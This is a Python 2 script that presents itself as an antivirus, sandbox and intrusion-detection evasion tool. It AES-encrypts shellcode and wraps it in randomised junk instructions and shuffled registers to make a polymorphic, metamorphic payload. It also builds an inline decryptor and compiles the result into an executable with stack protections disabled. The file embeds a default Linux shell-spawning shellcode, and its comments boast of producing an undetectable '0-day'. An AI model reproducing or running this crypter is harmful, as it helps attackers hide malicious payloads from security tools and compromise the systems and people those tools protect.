#!/usr/bin/python2

#-*- encoding:utf-8 -*-

from Crypto import Random
from Crypto.Cipher import AES
from random import randint
from random import shuffle
from sys import argv
from os import system as cmd
from copy import copy

def morphSig():
# metamorphic engine
	registers=[]
	extended='\x45'
	for i in range(64):
		registers.append(str2hex(str(hex(i+0xc0))))
# all 16 XMM registers in pairs <=> 16^2 possibilities = 256
# 0xc0 - 0xff <=> XMM0-7 combinations
# 0x45 <=> flag for XMM8-15
	operations=['\x0f\x58','\x0f\x5c','\x0f\x59','\x0f\x53','\x0f\x51','\x0f\x52','\x0f\x5f','\x0f\x5d']
	instructions=[]
	packed='\xf3'
	for operation in operations:
		instructions.append(operation)
		instructions.append(packed+operation)
		instructions.append(extended+operation)
		instructions.append(packed+extended+operation)
# all 16 arithmetic instructions for XMMs
#	length=(int(hex2str(Random.new().ad(1))[2],16)%8
	length=randint(3,10)
# random length from 3 to 10, so from 2^12^3 (70 billion) to 2^12^10 (almost 2^128, so a lot of) possibilities
	signature=''
	for cycle in range(length):
		instruction=randint(0,31)
		register=randint(0,63)
		signature+=instructions[instruction]+registers[register]
# in reality, registers are the same (8 only), but the extension is indicated by the flag, so the number of actual possibilities is twice as less ((32*64)^3 ~ 10 billion)
	return signature

def hex2str(code):
# convert hex to string and reformat
	return ''.join( [ "\\x%02x" % ord( x ) for x in code ] ).strip()

def hex1str(byte):
# convert hex of any format (including 0x1) to string
	return "0x{:02x}".format(byte)

def pad(code):
	if not len(code)%16:
		return code
# note that it's not a cryptographic padding (like PKCS7)
	padding='\x90'
	# \x90 <=> NOP <=> no operation for x86_84
	for i in range (0,16-len(code)%16):
		code+=padding
	return code

def str2hex(input):
# convert string to hex and reformat
	width=len(input)/4*8
# each '\x00' represents 8 bits
	input=int(input.replace("\\x",""),16)
	input=input+(1<<width)
	return ''.join(chr((input >> 8*n) & 255) for n in reversed(range(width/8)))

def prepare(ciphertext):
# polymorphic & metamorphic engine
# we don't know the length of the shellcode, so we have to adapt the length of the decipher
	decryption=''
	for block in range(len(ciphertext)/(16)):
		part=ciphertext[block*16:(1+block)*16]
		oneHalfCiphertext='\x49\xbe'+part[:len(part)/2]+'\x66\x49\x0f\x6e'+movq14[0]
		twoHalfCiphertext='\x49\xbf'+part[len(part)/2:][len(part)/4:]+part[len(part)/2:][:len(part)/4]+'\x66\x49\x0f\x6e'+movq15[3]
		preparation='\x0f\xc6'+xmm[0][0]+'\x1b\x0f\xc6'+xmm[0][3]+'\x1b'
		decrypt='\x66\x41\x0f\xef'+xmm[0][7]+'\x66\x41\x0f\x38\xde'+xmm[0][6]+'\x66\x41\x0f\x38\xde'+xmm[0][5]+'\x66\x41\x0f\x38\xde'+xmm[0][4]+'\x66\x41\x0f\x38\xde'+xmm[0][3]+'\x66\x41\x0f\x38\xde'+xmm[0][2]+'\x66\x41\x0f\x38\xde'+xmm[0][1]+'\x66\x41\x0f\x38\xde'+xmm[0][0]+'\x66\x0f\x38\xde'+xmm[0][7]+'\x66\x0f\x38\xde'+xmm[0][6]+'\x66\x0f\x38\xdf'+xmm[0][5]
		if block == 0:
#			storage='\x48\xbe\x99\x99\x59\xff\xff\xff\xff\xff\x48\xb8\x89\x96\xf9\xfe\xff\xff\xff\xff\x48\x29\xc6\x0f\x29\x06'
##			storage='\x48\xbe\x99\x99\x59\xff\xff\xff\xff\xff\x48\xb8\x99\x90\xf9\xfe\xff\xff\xff\xff\x48\x29\xc6\x0f\x29\x06'
			storage=''
			oneStorage=['\x48','\xbe']
			for byte in oneStorage:
				storage+=byte
			oneSub=[]
			twoSub=[]
			firstOffset=randint(1,255)
			secondOffset=randint(1,255)
			thirdOffset=randint(1,255)
			fourthOffset=randint(1,255)
			fifthOffset=randint(1,255)
			sixOffset=randint(0x61,255)
			sixthOffset=sixOffset-0x60
			sevenOffset=randint(10,255)
			seventhOffset=sevenOffset-9
			eighthOffset=randint(1,255)
# in order to obfuscate this constant, we will generate random numbers, the subtraction of which gives the addresse
# and another huge number of possibilities here : (2^8-1)^6*(255-0x61)*(255-10) ~ 10^20 ~ 2^64
			oneSub.append(str2hex(hex1str(eighthOffset)))
			oneSub.append(str2hex(hex1str(sevenOffset)))
			oneSub.append(str2hex(hex1str(sixOffset)))
			oneSub.append(str2hex(hex1str(fifthOffset)))
			oneSub.append(str2hex(hex1str(fourthOffset)))
			oneSub.append(str2hex(hex1str(thirdOffset)))
			oneSub.append(str2hex(hex1str(secondOffset)))
			oneSub.append(str2hex(hex1str(firstOffset)))
			twoSub.append(str2hex(hex1str(eighthOffset)))
			twoSub.append(str2hex(hex1str(seventhOffset)))
			twoSub.append(str2hex(hex1str(sixthOffset)))
			twoSub.append(str2hex(hex1str(fifthOffset)))
			twoSub.append(str2hex(hex1str(fourthOffset)))
			twoSub.append(str2hex(hex1str(thirdOffset)))
			twoSub.append(str2hex(hex1str(secondOffset)))
			twoSub.append(str2hex(hex1str(firstOffset)))
# it is necessary to reformat string and hex twice because, the format can be 0x1 whereas we need 0x01
			for byte in oneSub:
				storage+=byte
			twoStorage=['\x48','\xb8']
			for byte in twoStorage:
				storage+=byte
			for byte in twoSub:
				storage+=byte
			threeStorage=['\x48','\x29','\xc6','\x0f','\x29',movaps[0]]
			for byte in threeStorage:
				storage+=byte
# the buffer will be not 0x600310, but 0x600900 because, gcc
		else:
			storage='\x0f\x29'+movapsNext[0]+str2hex(str(hex(0x10*block)))
# that's why the length of the shellcode is limited to 16 bytes key + 15* 16 bytes block,so 0x10*15=240 bytes of shellcode, otherwise we will have null bytes and overflows, although it's not a technical limitation, I didn't implement such possibility because, most of the shellcodes are not such long for Linux and for ethical reasons :)
		decryption+=oneHalfCiphertext+twoHalfCiphertext+preparation+decrypt+storage
	return decryption

movq14=['\xc6','\xce','\xd6','\xde','\xe6','\xee','\xf6','\xfe']
movq15=['\xc7','\xcf','\xd7','\xdf','\xe7','\xef','\xf7','\xff']
movaps=['\x06','\x0e','\x16','\x1e','\x26','\x2e','\x36','\x3e']
movapsNext=['\x46','\x4e','\x56','\x5e','\x66','\x6e','\x76','\x7e']
xmm=[]
opcode=0xc0
for i in range(8):
        inner=[]
        for j in range(8):
                inner.append(str2hex(str(hex(opcode))))
                opcode+=1
        xmm.append(inner)
# XMMs substitution will add some difficulty for IDPSes
sub=[1,2,3,4,5,6,7]
shuffle(sub)
sub.insert(0,0)
# we would have 40320 possibilities (factorial of 8), however, by substituting 0, the decryption will fail almost all the time (I still don't know why (should I erase XMMs before modification?)), so 5040 possibilities
index=0
for key in sub:
	tmp=movq14[index]
	movq14[index]=movq14[key]
	movq14[key]=tmp
	tmp=movq15[index]
	movq15[index]=movq15[key]
	movq15[key]=tmp
	tmp=movaps[index]
	movaps[index]=movaps[key]
	movaps[key]=tmp
	tmp=movapsNext[index]
	movapsNext[index]=movapsNext[key]
	movapsNext[key]=tmp
	index+=1
for i in range(8):
	for j in range(8):
		tmp=xmm[i][j]
		xmm[i][j]=xmm[sub[i]][sub[j]]
		xmm[sub[i]][sub[j]]=tmp

# let's make it with some style
print '		                         __________'
print '		                      .~#########%%;~.'
print '		                     /############%%;`\ '
print '		                    /######/~\/~\%%;,;,\ '
print '		                   |#######\    /;;;;.,.|'
print '		                   |#########\/%;;;;;.,.|'
print '		          XX       |##/~~\####%;;;/~~\;,|       XX'
print '		        XX..X      |#|  o  \##%;/  o  |.|      X..XX'
print '		      XX.....X     |##\____/##%;\____/.,|     X.....XX'
print '		 XXXXX.....XX      \#########/\;;;;;;,, /      XX.....XXXXX'
print '		X |......XX%,.@      \######/%;\;;;;, /      @#%,XX......| X'
print '		X |.....X  @#%,.@     |######%%;;;;,.|     @#%,.@  X.....| X'
print '		X  \...X     @#%,.@   |# # # % ; ; ;,|   @#%,.@     X.../  X'
print '		 X# \.X        @#%,.@                  @#%,.@        X./  #'
print '		  ##  X          @#%,.@              @#%,.@          X   #'
print '		, "# #X            @#%,.@          @#%,.@            X ##'
print "		   `###X             @#%,.@      @#%,.@             ####'"
print "		  . ' ###              @#%.,@  @#%,.@              ###`\""
print "		    . \";\"                @#%.@#%,.@                ;\"` ' ."
print "		      '                    @#%,.@                   ,."
print '		      ` ,           @#%,.@  @@                `'
print '		                          @@@  @@@  '
print "		     ___  ___                 _      ___   _____ _____ "
print "		     |  \/  |                | |    / _ \ |  ___/  ___|"
print "		     | .  . | ___  _ __ _ __ | |__ / /_\ \| |__ \ `--. "
print "		     | |\/| |/ _ \| '__| '_ \| '_ \|  _  ||  __| `--. \ "
print "		     | |  | | (_) | |  | |_) | | | | | | || |___/\__/ /"
print "		     \_|  |_/\___/|_|  | .__/|_| |_\_| |_/\____/\____/ "
print "		                       | |                             "
print "		                       |_|                             "
print ""
print "			 IDPS & SandBox & AntiVirus STEALTH KILLER"
print ""

key = Random.new().read(16)
#key = '\x4a\xc9\x6a\xda\x73\x4b\x61\x1b\x5e\xbc\xfd\xc3\x7b\x29\x7e\x69'
#key=key.replace("\x00","\x11")
clean=False
while not clean:
	for byte in key:
       		if byte == "\x00":
               		key=Random.new().read(16)
               		continue
        clean=True
# we will use a random 16 bytes (128 bits) key/encryption since, it's more fast and fairly enough, however, we don't want null bytes in our key/code
		
input=raw_input('ENTER YOUR SHELLCODE (like \\x31\\xc0... or blank for a default Linux shell) : ')
if not input:
	shellcode= '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
else:
	shellcode=str2hex(input) 
print ''
print "SHELLCODE TO MORPH : "+hex2str(shellcode)
warnings='\xb0\xb1\xb2\xb3'
for byte in shellcode:
	for char in warnings:
		if byte == char:
			print ''
			print 'WARNING : IF YOU ARE USING 8-BIT REGISTERS (AL, BL, CL, DL) DECRYPTION MIGHT FAIL'
# for some reason, sometimes decipher fails to stop after the shellcode and continue the execution through the memory, it's probably linked to an abnormal padding/addressing, but further debugging is necessary (should I erase XMMs before modification?)
shellcode=pad(shellcode)
# AES is a block cipher, it operates blocks of a fixed size (16 bytes in our case), so we need to make the code modulo the block size, in order it could be encrypted
print ''
print "PADDED CODE : "+hex2str(shellcode)
if len(hex2str(shellcode)) > (240*2*2):
# x2 because of "\x" and another x2 bacause, opcode representation
	print ''
	print 'SHELLCODE TOO LONG, MAX 240 BYTES'
	exit(1)
cipher = AES.AESCipher(key, AES.MODE_ECB)
# ECB mode is the simplest and the fastest, it has a huge security lack though, but not for our purpose, so we have already 2^128 possibilities

ciphertext = cipher.encrypt(shellcode)
clean=False
while not clean:
	for byte in ciphertext:
		if byte == "\x00":
			key=Random.new().read(16)
			while not clean:
        			for byte in key:
                			if byte == "\x00":
                        			key=Random.new().read(16)
                        			continue
        			clean=True
			clean=False
			cipher = AES.AESCipher(key, AES.MODE_ECB)
			ciphertext=cipher.encrypt(shellcode)
			continue
	clean=True
# no null bytes

print ''
print "KEY : "+hex2str(key)
print ''
print "ENCRYPTED CODE : "+hex2str(ciphertext)

# let's foul the signature
signatureStart=morphSig()
signatureEnd=morphSig()
oneHalfKey='\x49\xbe'+key[:len(key)/2]+'\x66\x49\x0f\x6e'+movq14[0]
twoHalfKey='\x49\xbf'+key[len(key)/2:][len(key)/4:]+key[len(key)/2:][:len(key)/4]+'\x66\x49\x0f\x6e'+movq15[3]
# another 2^128 possibilities per block
insertKey='\x0f\xc6'+xmm[0][0]+'\x1b\x0f\xc6'+xmm[0][3]+'\x1b\x0f\x28'+xmm[5][0]+'\x66\x0f\xef'+xmm[2][2]
expandKey='\x66\x0f\x3a\xdf'+xmm[1][0]+'\x01\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x0f\x38\xdb'+xmm[6][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x02\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x0f\x38\xdb'+xmm[7][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x04\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[0][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x08\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[1][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x10\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[2][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x20\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[3][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x40\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[4][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x80\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[5][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x1b\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x66\x44\x0f\x38\xdb'+xmm[6][0]+'\x66\x0f\x3a\xdf'+xmm[1][0]+'\x36\x66\x0f\x70'+xmm[1][1]+'\xff\x0f\xc6'+xmm[2][0]+'\x10\x66\x0f\xef'+xmm[0][2]+'\x0f\xc6'+xmm[2][0]+'\x8c\x66\x0f\xef'+xmm[0][2]+'\x66\x0f\xef'+xmm[0][1]+'\x44\x0f\x28'+xmm[7][0]
decryption=prepare(ciphertext)
# futher obfuscation of values is possible, but since it's already a 0-day, there's no need, for now
exe='\xff\xe6'
shellcode=signatureStart+oneHalfKey+twoHalfKey+insertKey+expandKey+decryption+exe+signatureEnd
print ''
print "MORPHED CODE (decipher with encrypted code): "+hex2str(shellcode)
print ''
input=raw_input('PRODUCE AN EXECUTABLE (blank to confirm)? : ')
#input=input.lower()
#if input == 'y' or input == 'yes':
if not input :
	file=open("shellcode.c","w")
	file.write("unsigned char shellcode[]=\""+hex2str(shellcode)+"\";")
	file.write("main(){int (*ret)()=(int(*)()) shellcode; ret();}")
	file.close()
	cmd("gcc -fno-stack-protector -z execstack shellcode.c -o shellcode && rm shellcode.c")
# stack protector is mandatory in some cases
	print ''
	print 'READY TO LAUNCH : ./shellcode'
print ''
# as you can see, the total number of possible produced shellcodes for one given of this morpher is far more that the number of atoms in the univers (>10^80) and it's pretty hard to heuristically detect it, as well as using sandboxing

